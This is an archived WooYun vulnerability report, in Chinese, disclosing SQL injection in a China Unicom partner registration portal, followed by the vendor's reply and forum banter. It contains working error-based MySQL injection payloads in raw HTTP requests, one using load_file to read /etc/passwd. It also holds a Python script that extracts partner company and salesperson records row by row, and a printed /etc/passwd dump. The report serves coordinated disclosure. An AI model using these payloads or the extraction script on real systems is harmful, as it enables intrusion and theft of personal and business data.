{"id": 72330, "wybug_id": "wooyun-2015-0152672", "wybug_title": "中国联通某重要站点SQL注入(近百万合作企业及业务员信息泄漏可load_file)", "wybug_corp": "中国联通", "wybug_author": "超威蓝猫", "wybug_date": "2015-11-07 22:31", "wybug_open_date": "2015-12-26 10:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向公众公开  简要描述： 其实这篇报告主要讲的是工具的使用(吧,  顺便学学python  x_x 详细说明：  https://**.**.**.**随手点开条公告，id参数存在注入\nPOST /PAR_PO_WW/indexController.jhtml?cmd=noticeDetail HTTP/1.1Host: **.**.**.**Connection: keep-aliveContent-Length: 101Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://**.**.**.**Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: https://**.**.**.**/portal/index.jhtmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: JSESSIONID=DF4CD228E00D50823CB5A1C81E200CC6id=61706' and 1=(select 1E308*if((select*from(select substr(load_file('/etc/passwd'),1,450))x),2,2))#\n\n\n\n\nhttps://**.**.**.**/PAR_PO_WW/WebRegController.jhtml第二部录入信息处，填入\"组织机构代码\"时会向服务端请求其可用性，此处存在注入：\n\n由于读不到information_schema, 无法获取列名，所以我们把提交资料时发送的包里的各个参数名测试一遍，看看哪些是可用的：\n\n正则大法好:\n\n\n\n扔进burpsuite跑一跑：\n\n我们把不存在的列名过滤出来，全选后删除，然后将剩下的可用列名导出\n\n\n\n然后就可以大把大把地抓数据辣！\n\n近百万的企业数据哦, 包括但不限于: 合作方名称、组织机构代码\\统一社会信用代码、机构地址、税务登记号、所在国家省份城市、法人代表、注册资金、公司电话号码、营业执照注册号、业务员姓名、身份证号、手机号 等\nPOST /PAR_PO_WW/WebMptBaseInfoController.jhtml?cmd=validateOrgCode HTTP/1.1Host: **.**.**.**Connection: keep-aliveContent-Length: 93Accept: application/json, text/javascript, */*; q=0.01Origin: https://**.**.**.**X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: https://**.**.**.**/PAR_PO_WW/WebRegController.jhtml?cmd=toRegInfoAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: JSESSIONID=18ED1DDDDB3F6FCF80CF16D248935D55org_code=' and 1=(select 1E308*if((select*from(select count(*) from t_mpt_base_info)x),2,2))#\n\n\n贴上一段自己写的 PoC x_x (随手写写，仅作证明用\nimport requestsimport reimport urllibdef getHeadersFromHttpRaw(raw_text):\t#return a dict containing headers from raw\theaders={}\tt=raw_text.split('\\n\\n',1)[0].split('\\n')\tfor i in range(1,len(t)):\t\tt2=t[i].split(\": \")\t\theaders[t2[0]]=t2[1]\treturn headersdef mysqlHextoRaw(Hexed_text):\tb=\"\"\ti=0\twhile(i<len(Hexed_text)):\t\tb+=\"%\"+Hexed_text[i:i+2]\t\ti+=2\treturn urllib.unquote(b).decode('utf8')pattern=**.**.**.**pile(r\"(?<=1E308 \\* if\\(\\(select ')(.*?)(?=' from dual)\")raw1=\"\"\"Host: **.**.**.**Connection: CloseAccept: application/json, text/javascript, */*; q=0.01Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflate\"\"\"data1=\"\"\"partner_name=' and 1=(select 1E308*if((select*from(select CONCAT_WS(\"|\",IFNULL(partner_type,''),IFNULL(card_type,''),IFNULL(org_code,''),hex(IFNULL(partner_name,'')),IFNULL(partner_name_en,''),IFNULL(country,''),hex(IFNULL(province_code,'')),hex(IFNULL(city_name,'')),IFNULL(tax_type,''),IFNULL(tax_code,''),IFNULL(corp_portal,''),hex(IFNULL(partner_address,'')),IFNULL(org_type,''),IFNULL(corp_alias,''),hex(IFNULL(legal_representative,'')),IFNULL(orgcode_start_date,''),IFNULL(orgcode_end_date,''),IFNULL(enroll_fund,''),IFNULL(currency_type,''),IFNULL(phone_number,''),IFNULL(fax_number,''),IFNULL(admin_org,''),IFNULL(admin_org_code,''),IFNULL(buss_type,''),IFNULL(post_code,''),IFNULL(enroll_code,''),IFNULL(enroll_date,''),IFNULL(license_code,''),IFNULL(license_code_start,''),IFNULL(license_code_end,''),hex(IFNULL(buss_scope,'')),IFNULL(is_listed,''),IFNULL(partner_id,''),IFNULL(partner_mdm_code,''),IFNULL(parent_code,''),IFNULL(first_reg_role,''),IFNULL(first_reg_prov,'')) from t_mpt_base_info limit $._.$,1)x),2,2))#\"\"\"for i in range(888,899):\ta=requests.post(\"https://**.**.**.**:443/PAR_PO_WW/WebMptBaseInfoController.jhtml?cmd=validatePartnerName\",headers=getHeadersFromHttpRaw(raw1),data=data1.replace(\"$._.$\",str(i)),verify=False,proxies={\"https\":\"http://localhost:27000\"})\tb=pattern.search(a.content).group()\tc=b.split(\"|\")\tfor i in [3,6,7,11,14,30]:\t\tc[i]=mysqlHextoRaw(c[i])\tb=\"|\".join(c)\tprint b\n\n\n   漏洞证明：  /etc/passwd\nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinavahi-autoipd:x:100:101:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologingdm:x:42:42::/var/gdm:/sbin/nologinsabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologindba:x:102:500::/home/dba:/bin/bashmysql:x:601:500::/home/mysql:/bin/bashaiuap:x:602:602::/home/aiuap:/bin/bashaiuap_jc:x:604:100::/home/aiuap_jc:/bin/bashtest:x:605:605::/home/test:/bin/bashunionmon:x:606:606::/home/unionmon:/bin/bashimonitor:x:607:607::/home/imonitor:/bin/bashdeployer:x:608:608::/home/deployer:/bin/bash\n   修复方案：  ._. 联通更专业   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-11-11 10:39 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国联通集团公司通报,由其后续协调网站管理部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-11-07 22:52 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:718 漏洞数:151        | 240)\t\t \n  运营杀手    \n     2015-11-07 22:53 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1102 漏洞数:118        | STEAM_0:0:55968383)\t\t \n  @xsser 剑心哥哥辛苦了 这么晚还在审洞 ._.    \n     2015-11-07 23:09 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:267 漏洞数:20        | 当我又回首一切,这个世界会好吗?)\t\t \n  @超威蓝猫 我是在玩儿啊    \n     2015-11-07 23:29 |    \t\t偶然 \t\t\t( 普通白帽子  |\t\t\t        Rank:164 漏洞数:44        | 我是天空里一片云。)\t\t \n  @xsser 原来你就是传说的剑心啊，，咱们黄冈人撒    \n     2015-11-07 23:59 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:126 漏洞数:29        | 不会挖洞洞的猿猿不是好学生)\t\t \n  @超威蓝猫 你这么晚还提交漏洞- -    \n     2015-11-08 00:14 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1334 漏洞数:193        | 。)\t\t \n  蓝猫活了啊这是    \n     2015-11-08 00:17 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1102 漏洞数:118        | STEAM_0:0:55968383)\t\t \n  @金枪银矛小霸王 @scanf 冒个泡滚去撸线代了x_x    \n     2015-11-08 20:56 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:126 漏洞数:29        | 不会挖洞洞的猿猿不是好学生)\t\t \n  @超威蓝猫 - -。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}